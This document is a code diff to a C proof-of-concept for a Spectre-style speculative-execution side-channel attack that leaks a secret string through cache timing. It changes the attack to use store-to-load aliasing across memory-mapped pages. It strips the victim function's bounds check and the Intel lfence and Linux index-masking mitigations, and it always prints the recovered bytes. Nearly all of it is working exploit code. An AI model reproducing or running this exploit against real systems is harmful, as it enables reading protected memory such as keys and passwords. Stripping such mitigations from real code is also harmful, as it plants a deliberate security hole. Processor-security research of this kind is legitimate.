@@ -53,29 +53,30 @@ Victim code.
 unsigned int array1_size = 16;
 uint8_t unused1[64];
 uint32_t array1[16] = {
-  1,
-  2,
-  3,
-  4,
-  5,
-  6,
-  7,
-  8,
-  9,
-  10,
-  11,
-  12,
-  13,
-  14,
-  15,
-  16
+  0xb0,
+  0xb1,
+  0xb2,
+  0xb3,
+  0xb4,
+  0xb5,
+  0xb6,
+  0xb7,
+  0xb8,
+  0xb9,
+  0xba,
+  0xbb,
+  0xbc,
+  0xbd,
+  0xbe,
+  0xbf,
 };
 uint8_t unused2[64];
 uint8_t array2[256 * 512];
 int32_t big_block[4096];
 #define NUM_PAGES 1024
 volatile int32_t* load_addr[NUM_PAGES];
-volatile int32_t dropbag;
+#define NUM_BAGS (4096/(sizeof(int32_t)))
+volatile int32_t dropbags[NUM_BAGS];
 
 char * secret_string       = "The Magic Words are Squeamish Ossifrage.";
 const uint32_t secret[]     =
@@ -150,22 +151,7 @@ static inline unsigned long array_index_mask_nospec(unsigned long index,
 #endif
 
 void victim_function(size_t x, register volatile int32_t* dropbag, register volatile int32_t* load_addr) {
-  if (x < array1_size) {
-#ifdef INTEL_MITIGATION
-		/*
-		 * According to Intel et al, the best way to mitigate this is to 
-		 * add a serializing instruction after the boundary check to force
-		 * the retirement of previous instructions before proceeding to 
-		 * the read.
-		 * See https://newsroom.intel.com/wp-content/uploads/sites/11/2018/01/Intel-Analysis-of-Speculative-Execution-Side-Channels.pdf
-		 */
-		_mm_lfence();
-#endif
-#ifdef LINUX_KERNEL_MITIGATION
-    x &= array_index_mask_nospec(x, array1_size);
-#endif
-    *dropbag = array1[x]+1;
-  } else { *dropbag = 0; }
+  *dropbag = array1[x]+1;
   temp &= array2[(*(load_addr)-1) * 512];
 }
 
@@ -195,7 +181,7 @@ void flush_memory_sse(uint8_t * addr)
 
 /* Report best guess in value[0] and runner-up in value[1] */
 void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2], int score[2],
-    int results[256], int pagenum, int print_things) {
+    int results[256], int pagenum, int dropnum) {
   int tries, i, j, k, mix_i;
   unsigned int junk = 0;
   size_t training_x, x;
@@ -225,26 +211,32 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
 #endif
 
     training_x = tries % array1_size;
-    uint64_t training_alias = (uint64_t)&dropbag;
+    // training_x = 0;
+    uint64_t training_alias = (uint64_t)&dropbags[dropnum];
+    // training_alias = (uint64_t)load_addr[pagenum+1];
     uint64_t malicious_alias = (uint64_t)load_addr[pagenum];
-    int32_t* alias_p;
+    int32_t* alias_p = malicious_alias;
     for (int k = 0; k < 500; k++) {
       for (j = 25-1; j >= 0; j--) {
-        /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
+        // uint64_t training_alias = (uint64_t)&dropbags[k % NUM_BAGS];
+        /* Bit twiddling to set x=training_x if j%25!=0 or malicious_x if j%25==0 */
         /* Avoid jumps in case those tip off the branch predictor */
         x = (j - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
         x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
         alias_p = training_alias ^ (x & (malicious_alias ^ training_alias));
         x = training_x ^ (x & (malicious_x ^ training_x));
 
-        _mm_clflush( & array1_size);
+        /* printf("\nj: %d  x: %08x\n", j, x); */
+        /* printf("   alias: %016p\n", alias_p); */
+
         _mm_clflush( malicious_alias);
 
         /* Delay (can also mfence) */
         for (volatile int z = 0; z < 400; z++) {}
+        _mm_lfence();
 
         /* Call the victim! */
-        victim_function(x, &dropbag, alias_p);
+        victim_function(x, &dropbags[dropnum], alias_p);
 
       }
     }
@@ -320,18 +312,16 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
     //if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
     //  break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
   }
-  if (print_things) {
-    printf(">");
-    for (i = 32; i < 128; i++) { // printable range
-      if (results[i] > 0) {
-        printf("%c", i);
-      }
+  printf(">");
+  for (i = 32; i < 128; i++) { // printable range
+    if (results[i] > 0) {
+      printf("%c", i);
     }
-    printf("< ");
-    for (i = 0; i < 256; i++) {
-      if (results[i] > 0) {
-        printf("%02x/%d ", i, results[i]);
-      }
+  }
+  printf("< ");
+  for (i = 0; i < 256; i++) {
+    if (results[i] > 0) {
+      printf("%02x/%d ", i, results[i]);
     }
   }
   results[0] ^= junk; /* use junk so code above won’t get optimized out*/
@@ -377,10 +367,13 @@ int main(int argc,
   ftruncate(fd, 0x1000 * NUM_PAGES);
   int32_t* mmap_base = mmap(NULL, 0x1000 * NUM_PAGES, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
 
+  // arbitrary
+  int dropnum = 33;
+
   uint64_t alias_base = (uint64_t)mmap_base;
   // touch all the pages
   for (i = 0; i < NUM_PAGES; i++) {
-    load_addr[i] = (int32_t*)((((uint64_t)&dropbag) & 0xfff) + (alias_base + i * 0x1000));
+    load_addr[i] = (int32_t*)((((uint64_t)&dropbags[dropnum]) & 0xfff) + (alias_base + i * 0x1000));
     *(load_addr[i]) = 0xDD;
   }
 
@@ -390,7 +383,8 @@ int main(int argc,
   // offset so lower bits don't match
   load_addr[pagenum] = (int32_t*)(((uint64_t)load_addr[pagenum]) + 37);
 
-  printf("dropbag: %p\n  load_addr: %p\n   mmap: %p\n   diff: 0x%012x\n", &dropbag, load_addr[4], mmap_base, (uint64_t)load_addr[pagenum] - (uint64_t)mmap_base);
+  printf("  dropbag: %p\nload_addr: %p\n     mmap: %p\n     diff: 0x%012x\n", &dropbags[dropnum], load_addr[4], mmap_base, (uint64_t)load_addr[pagenum] - (uint64_t)mmap_base);
+  printf("&array1_size: %p\n", &array1_size);
 
   // touch the chosen page again just to be sure
   *(load_addr[pagenum]) = 0xCC;
@@ -467,7 +461,7 @@ int main(int argc,
        malicious x address. value and score are arrays that are
        populated with the results.
     */
-    readMemoryByte(cache_hit_threshold, malicious_x++, value, score, results, pagenum, 1);
+    readMemoryByte(cache_hit_threshold, malicious_x++, value, score, results, pagenum, dropnum);
 
     i++;
     printf("\n");
